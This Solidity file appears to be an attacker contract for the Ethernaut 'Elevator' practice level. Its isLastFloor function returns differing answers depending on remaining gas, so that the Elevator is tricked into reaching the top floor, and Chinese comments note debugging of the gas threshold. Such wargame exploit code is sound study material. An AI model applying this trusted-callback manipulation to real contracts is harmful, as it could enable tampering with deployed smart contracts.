// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'hardhat/console.sol';
interface Elevator {
  function  goTo() external returns (bool);
}


contract Building {
    bool public top;
  
    Elevator ele;
    
    uint256 public conut = 100000000;
    function initElev(address add) public{

        ele=Elevator(add);

    }
    function attackGO() public returns (bool what){

              what = ele.goTo();
              
    }

       function attackGO1() public returns (bool what){

              what = ele.goTo();
               conut =gasleft();

    }


    
    function isLastFloor() public  view returns (bool){
           
            //使用奇偶判断 需要调试debug gas的剩余量
            // uint256  gas = gasleft();
            // console.log(gas);
            // uint256 result = gas % 2;
            
            // console.log(result);
            // bool a =  result == 1 ? false:true;
            // return a; //使用奇偶

            // 使用gas 循环消耗 调用
          
            uint256 x=2;
            uint256 y=2;
            //conut =gasleft();
            if(gasleft()>2881000){//本地2881000  2881173

              do{                
                  x= x**2;
                  y=y**2;
                  uint256 aa=address(this).balance;
                  uint256 aa1=address(this).balance;
                  uint256 aa2=address(this).balance;
                  uint256 aa3=address(this).balance;
                   
                   //console.log(gasleft());//打印的话 gaslimit 可填写2970000
              }while(gasleft()>2881000);
              
              return false;
            }

            return true;

    }


}